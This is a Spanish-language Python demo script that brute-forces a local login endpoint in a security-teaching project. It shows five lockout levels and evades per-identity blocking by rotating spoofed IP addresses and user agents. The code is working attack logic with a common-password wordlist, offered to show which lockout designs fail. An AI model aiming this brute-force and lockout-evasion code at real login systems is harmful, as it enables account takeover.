"""
Script de demostración: fuerza bruta contra el endpoint SIN bloqueo
(nivel 1) del proyecto login-seguridad.

Objetivo: mostrar en la demo que, sin un mecanismo de bloqueo (nivel 1),
se puede probar una lista de contraseñas sin ninguna restricción, y que
el mismo ataque usa una estrategia distinta según qué mida el bloqueo:

    nivel 1: sin estrategia, no hace falta evadir nada.
    nivel 2: ninguna estrategia sirve, porque bloquea solo por usuario
             (es un bloqueo global, cambiar IP o user agent no alcanza).
    nivel 3: rota la IP apenas acumula 2 fallos con la misma IP (el
             servidor bloquea al 3er fallo, así que nunca llega a ese
             punto con una IP ya usada).
    nivel 4: además de la IP, rota el user agent con la misma lógica,
             porque el bloqueo depende de los tres datos juntos.
    nivel 5: usa la MISMA estrategia que el nivel 4 (rota IP y user
             agent), pero en este nivel no sirve: además del bloqueo
             por identidad, el servidor cuenta los fallos totales del
             usuario sin importar la identidad, así que tarde o
             temprano bloquea la cuenta igual. El script lo intenta
             igual, para que se vea cómo falla.

Uso:
    python fuerza-bruta.py
    python fuerza-bruta.py --nivel 3          # evade el bloqueo rotando IP
    python fuerza-bruta.py --nivel 4          # evade rotando IP y user agent
    python fuerza-bruta.py --nivel 5          # misma estrategia, pero falla
    python fuerza-bruta.py --usuario ana
    python fuerza-bruta.py --wordlist claves.txt
"""

import argparse
import itertools
import time
import requests

BASE_URL = "http://localhost:3000"

# Lista chica de ejemplo. La contraseña real (Clave123!) está incluida
# a propósito para que el script la encuentre.
WORDLIST_DEMO = [
    "123456", "password", "admin", "qwerty", "Clave123",
    "11111111", "abc123", "iloveyou", "monkey", "dragon",
    "sunshine", "princess", "football", "welcome", "login",
    "master", "shadow", "superman", "trustno1", "michael",
    "jennifer", "hunter2", "freedom", "whatever", "qazwsx",
    "zaq12wsx", "passw0rd", "123123123", "1q2w3e4r", "batman",
    "Admin123!", "letmein", "12345678", "clave123!", "Clave123!",
]
# Nota: "Clave123!" (la contraseña real) está en la posición 35, después
# del límite de 30 fallos del nivel 5 a propósito: así la demo de ese
# nivel se bloquea ANTES de llegar a probarla, mostrando que la
# estrategia de rotación fracasa.

# Valores para rotar y evadir el bloqueo de los niveles 3 y 4.
# El bloqueo de esos niveles depende de que la IP y/o el user agent
# se mantengan iguales, así que alcanza con cambiarlos cada pocos intentos.
IPS_ROTACION = [f"198.51.100.{n}" for n in range(1, 60)]
USER_AGENTS_ROTACION = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Safari/17.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
    "Mozilla/5.0 (Android 14; Mobile) Chrome/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/17.0",
]


def cargar_wordlist(path):
    with open(path, encoding="utf-8") as f:
        return [linea.strip() for linea in f if linea.strip()]


def valores_para(nivel, grupo, ip_base, ua_base):
    """Decide qué IP y user agent usar, según el número de "grupo"
    (se cambia de grupo antes de acumular 3 fallos con la misma
    identidad, que es cuando el servidor bloquea)."""
    rota_ip = nivel in (3, 4, 5) and grupo > 0
    # Los niveles 4 y 5 además exigen mismo user agent: rotarlo
    # también sirve para el bloqueo POR IDENTIDAD (en el nivel 5 no
    # alcanza igual, por el contador global).
    rota_ua = nivel in (4, 5) and grupo > 0

    ip = IPS_ROTACION[grupo % len(IPS_ROTACION)] if rota_ip else ip_base
    ua = USER_AGENTS_ROTACION[grupo % len(USER_AGENTS_ROTACION)] if rota_ua else ua_base
    return ip, ua


def intentar(nivel, usuario, password, ip, user_agent):
    url = f"{BASE_URL}/login/nivel{nivel}"
    body = {"username": usuario, "password": password, "ip": ip, "userAgent": user_agent}
    try:
        r = requests.post(url, json=body, timeout=5)
        return r.status_code, r.json()
    except requests.RequestException as e:
        return None, {"msg": f"No se pudo conectar: {e}"}


def main():
    ap = argparse.ArgumentParser(description="Fuerza bruta de demostración contra login-seguridad")
    ap.add_argument("--nivel", type=int, default=1, choices=[1, 2, 3, 4, 5],
                     help="Nivel a atacar (1 = sin bloqueo). Default: 1")
    ap.add_argument("--usuario", default="admin")
    ap.add_argument("--ip", default="198.51.100.23", help="IP a enviar en el JSON")
    ap.add_argument("--user-agent", default="FuerzaBrutaDemo/1.0", dest="user_agent")
    ap.add_argument("--wordlist", help="Archivo con una contraseña por línea. Si no se pasa, usa la lista de ejemplo.")
    ap.add_argument("--delay", type=float, default=0.3, help="Segundos de espera entre intentos")
    args = ap.parse_args()

    claves = cargar_wordlist(args.wordlist) if args.wordlist else WORDLIST_DEMO

    estrategia = {
        1: "sin estrategia (el nivel 1 no bloquea nada)",
        2: "ninguna estrategia evade este nivel: bloquea solo por usuario",
        3: "rotando la IP apenas acumula 2 fallos con la misma IP",
        4: "rotando la IP y el user agent apenas acumula 2 fallos",
        5: "la misma rotación que el nivel 4 (no evade el contador global de 30 fallos)",
    }[args.nivel]
    print(f"Atacando nivel {args.nivel} | usuario={args.usuario} | {len(claves)} contraseñas a probar")
    print(f"Estrategia: {estrategia}\n")

    # El servidor bloquea al 3er fallo (MAX_FALLOS=3) con la misma
    # identidad, así que rotamos apenas se acumulan 2 fallos: nunca
    # se llega a un 3er intento con la misma IP/user agent.
    grupo = 0
    fallos_grupo_actual = 0
    ip_anterior, ua_anterior = None, None

    idx = 0  # índice dentro de claves; solo avanza cuando el intento se cuenta
    while idx < len(claves):
        clave = claves[idx]
        ip, ua = valores_para(args.nivel, grupo, args.ip, args.user_agent)
        if (ip, ua) != (ip_anterior, ua_anterior) and grupo > 0:
            print(f"      -> rotando: ip={ip} | user-agent={ua}")
        ip_anterior, ua_anterior = ip, ua

        status, data = intentar(args.nivel, args.usuario, clave, ip, ua)
        print(f"[{idx + 1:>3}] '{clave}' -> status={status} | {data.get('msg')}")

        if status == 200 and data.get("ok"):
            print(f"\nContraseña encontrada: '{clave}' (intento {idx + 1} de {len(claves)})")
            return

        if status == 429:
            if args.nivel in (3, 4):
                # No debería pasar con la rotación proactiva, pero por
                # las dudas: rota y reintenta la MISMA contraseña (no
                # avanza idx).
                grupo += 1
                fallos_grupo_actual = 0
                print("      -> igual llegó un bloqueo: se rota y se reintenta esta contraseña")
                continue
            if args.nivel == 5:
                # Acá la rotación no sirve: el bloqueo es por el total
                # de fallos del usuario, sin importar identidad. Reintentar
                # rotando solo sumaría más fallos al mismo contador global.
                print(f"\nLa rotación de IP/user agent NO evadió el nivel 5, después de {idx + 1} intentos.")
                print(f"Detalle: {data.get('msg')}")
                print("El bloqueo es GLOBAL por usuario (cuenta los fallos totales, no por identidad):")
                print("cambiar la IP y el user agent no resetea ese contador, así que la estrategia fracasa.")
                return
            print("\nEl servidor bloqueó la cuenta. Fuerza bruta detenida por el mecanismo de seguridad.")
            print(f"Detalle: {data.get('msg')}")
            return

        fallos_grupo_actual += 1
        if args.nivel in (3, 4, 5) and fallos_grupo_actual >= 2:
            grupo += 1
            fallos_grupo_actual = 0

        idx += 1
        time.sleep(args.delay)

    print("\nSe terminó la lista sin encontrar la contraseña.")


if __name__ == "__main__":
    main()
